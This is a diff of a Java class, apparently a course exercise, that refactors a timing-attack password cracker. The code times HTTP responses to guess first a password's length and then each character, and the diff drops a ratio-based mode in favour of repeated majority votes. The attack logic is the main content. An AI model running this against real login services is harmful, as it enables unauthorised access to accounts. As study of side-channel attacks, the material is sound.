@@ -30,12 +30,6 @@ public class ex01_M2 {
     public static int DIFFICULTY = 1;
     public static String USER_ID = "ID";
 
-    public static boolean DO_RATIO_CHECK = false;
-    public static float MIN_RATIO = 1.05f;
-    public static float MAX_RATIO = 150f;
-    public static float RATIO_DIFFERENCE_FIRST_TO_SECONDS = 0.15f;
-
-    public static boolean DO_N_TIME_CHECK = true;
     public static int N_TIME_CHECK = 2;
 
     // Flags
@@ -155,10 +149,6 @@ public class ex01_M2 {
             for (String password : passwordsToCheck) {
                 responseTime = checkResponseTimeInMicrosecond(buildUrlFromPassword(password));
 
-                if (DEBUG_MESSAGE) {
-                    //System.out.println(String.format("password %s took %f microseconds", password, responseTime));
-                }
-
                 if (responseTime == FOUND_THE_PASSWORD)
                 {
                     foundTheRightPassword(password);
@@ -193,74 +183,11 @@ public class ex01_M2 {
         return true;
     }
 
-
-    public static class TimingAttackResult {
-
-        public String password;
-        public Double ratio;
-
-        public TimingAttackResult(String password, Double ratio) {
-            this.password = password;
-            this.ratio = ratio;
-        }
-
-    }
-
-
     public static void calculateAverageForEachPossiblePassword(Map<String, PossiblePasswordData> results)
     {
         for (String password: results.keySet()) {
             results.get(password).passwordResponseAverage = results.get(password).passwordSumTime / results.get(password).passwordAttempts;
         }
-    }
-
-    public static double calculateTotalAverageWithoutOnePassword(Map<String, PossiblePasswordData> results, String passwordToIgnore)
-    {
-        double totalSum = 0;
-        for (String password: results.keySet()) {
-            if(password.equals(passwordToIgnore)){
-                continue;
-            }
-            totalSum += results.get(password).passwordResponseAverage;
-        }
-        return totalSum / (results.size() - 1);
-    }
-
-    public static List<TimingAttackResult> calculateNBiggestRatio(int nPosition, Map<String, PossiblePasswordData> results)
-    {
-        List<TimingAttackResult> nBiggestRatio = new ArrayList<TimingAttackResult>();
-
-        for (int i = 0; i < nPosition; i++) {
-
-            Map<String, PossiblePasswordData> resultsWithoutCalculatedRatio = new HashMap<String, PossiblePasswordData>();
-            for (String password: results.keySet()) {
-
-                boolean passwordAlreadyIncluded = false;
-                for (TimingAttackResult includedPassword : nBiggestRatio) {
-                    if (password.equals(includedPassword.password)) {
-                        passwordAlreadyIncluded = true;
-                    }
-                }
-                if (passwordAlreadyIncluded){
-                    continue;
-                }
-                resultsWithoutCalculatedRatio.put(password, results.get(password));
-            }
-
-            String maxRatioPassword = resultsWithoutCalculatedRatio.keySet().iterator().next();
-            double maxRatio = resultsWithoutCalculatedRatio.get(maxRatioPassword).passwordResponseAverage / calculateTotalAverageWithoutOnePassword(resultsWithoutCalculatedRatio, maxRatioPassword);
-            for (String password: resultsWithoutCalculatedRatio.keySet()) {
-                double currentRatio = resultsWithoutCalculatedRatio.get(password).passwordResponseAverage / calculateTotalAverageWithoutOnePassword(resultsWithoutCalculatedRatio, password);
-                if (currentRatio > maxRatio){
-                    maxRatio = currentRatio;
-                    maxRatioPassword = password;
-                }
-            }
-
-            nBiggestRatio.add(new TimingAttackResult(maxRatioPassword, maxRatio));
-        }
-
-        return nBiggestRatio;
     }
 
     public static String getMaxAverage(Map<String, PossiblePasswordData> results)
@@ -299,49 +226,29 @@ public class ex01_M2 {
             }
             calculateAverageForEachPossiblePassword(results);
 
-            for (String password : possiblePasswords) {
-                if (DEBUG_MESSAGE) {
+            if (DEBUG_MESSAGE) {
+                for (String password : possiblePasswords) {
                     System.out.println(String.format("Length %d took %f milliseconds", password.length(), results.get(password).passwordResponseAverage / 1000));
                 }
             }
 
-            if (DO_RATIO_CHECK) {
-                List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
-                length = ratio.get(0).password.length();
-                if (DEBUG_MESSAGE) {
-                    System.out.println(String.format("Length %d bigger then other by %f times", length, ratio.get(0).ratio));
-                    System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(1).password.length(), ratio.get(1).ratio));
-                    System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(2).password.length(), ratio.get(2).ratio));
-                }
+            int lengthWithMaxAverage = getMaxAverage(results).length();
+            possibleLength[lengthWithMaxAverage] += 1;
 
-                if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO && (ratio.get(0).ratio - ratio.get(1).ratio) >= RATIO_DIFFERENCE_FIRST_TO_SECONDS) {
-                    foundLength = true;
-                }
-            }
-            else if(DO_N_TIME_CHECK)
-            {
-                int lengthWithMaxAverage = getMaxAverage(results).length();
-                possibleLength[lengthWithMaxAverage] += 1;
-
-                if (DEBUG_MESSAGE) {
-                    for (int i = 0; i <= MAX_PASSWORD_LENGTH; i++) {
-                        if (possibleLength[i] != 0) {
-                            System.out.println(String.format("Length %d occurs %d times", i, possibleLength[i]));
-                        }
-                    }
-                }
-
-                if (possibleLength[lengthWithMaxAverage] >= N_TIME_CHECK) {
-                    length = lengthWithMaxAverage;
-                    foundLength = true;
-                    if (DEBUG_MESSAGE) {
-                        System.out.println(String.format("Length %d occurs %d times", lengthWithMaxAverage, N_TIME_CHECK));
+            if (DEBUG_MESSAGE) {
+                for (int i = 0; i <= MAX_PASSWORD_LENGTH; i++) {
+                    if (possibleLength[i] != 0) {
+                        System.out.println(String.format("Length %d occurs %d times", i, possibleLength[i]));
                     }
                 }
             }
-            else {
-                length = getMaxAverage(results).length();
+
+            if (possibleLength[lengthWithMaxAverage] >= N_TIME_CHECK) {
+                length = lengthWithMaxAverage;
                 foundLength = true;
+                if (DEBUG_MESSAGE) {
+                    System.out.println(String.format("Length %d occurs %d times", lengthWithMaxAverage, N_TIME_CHECK));
+                }
             }
         }
 
@@ -378,55 +285,32 @@ public class ex01_M2 {
                 }
                 calculateAverageForEachPossiblePassword(results);
 
-                for (String password : possiblePasswords)
-                {
-                    if (DEBUG_MESSAGE) {
+                if (DEBUG_MESSAGE) {
+                    for (String password : possiblePasswords)
+                    {
                         System.out.println(String.format("char %c took %f milliseconds", password.charAt(currentPasswordIndex), results.get(password).passwordResponseAverage / 1000));
                     }
                 }
 
-                if (DO_RATIO_CHECK)
-                {
-                    List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
-                    nextChar = ratio.get(0).password.charAt(currentPasswordIndex);
-                    if (DEBUG_MESSAGE) {
-                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(0).password.charAt(currentPasswordIndex), ratio.get(0).ratio));
-                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(1).password.charAt(currentPasswordIndex), ratio.get(1).ratio));
-                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(2).password.charAt(currentPasswordIndex), ratio.get(2).ratio));
-                    }
-                    if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO && (ratio.get(0).ratio - ratio.get(1).ratio) >= RATIO_DIFFERENCE_FIRST_TO_SECONDS)
-                    {
-                        foundNextChar = true;
-                        charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
-                    }
-                }
-                else if(DO_N_TIME_CHECK)
-                {
-                    char possibleNextChar = getMaxAverage(results).charAt(currentPasswordIndex);
-                    charScore.put(possibleNextChar, charScore.get(possibleNextChar) + 1);
+                char possibleNextChar = getMaxAverage(results).charAt(currentPasswordIndex);
+                charScore.put(possibleNextChar, charScore.get(possibleNextChar) + 1);
 
-                    if (DEBUG_MESSAGE) {
-                        for (char c: charScore.keySet()) {
-                            if (charScore.get(c) != 0) {
-                                System.out.println(String.format("Char %c occurs %d times", c, charScore.get(c)));
-                            }
+                if (DEBUG_MESSAGE) {
+                    for (char c: charScore.keySet()) {
+                        if (charScore.get(c) != 0) {
+                            System.out.println(String.format("Char %c occurs %d times", c, charScore.get(c)));
                         }
                     }
-
-                    if (charScore.get(possibleNextChar) >= N_TIME_CHECK)
-                    {
-                        if (DEBUG_MESSAGE) {
-                            System.out.println(String.format("Char %c occurs %d times", possibleNextChar, N_TIME_CHECK));
-                        }
-                        nextChar = possibleNextChar;
-                        foundNextChar = true;
-                        charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
-                    }
                 }
-                else {
-                    nextChar = getMaxAverage(results).charAt(currentPasswordIndex);
-                    charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
+
+                if (charScore.get(possibleNextChar) >= N_TIME_CHECK)
+                {
+                    if (DEBUG_MESSAGE) {
+                        System.out.println(String.format("Char %c occurs %d times", possibleNextChar, N_TIME_CHECK));
+                    }
+                    nextChar = possibleNextChar;
                     foundNextChar = true;
+                    charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
                 }
 
                 if (DEBUG_MESSAGE) {
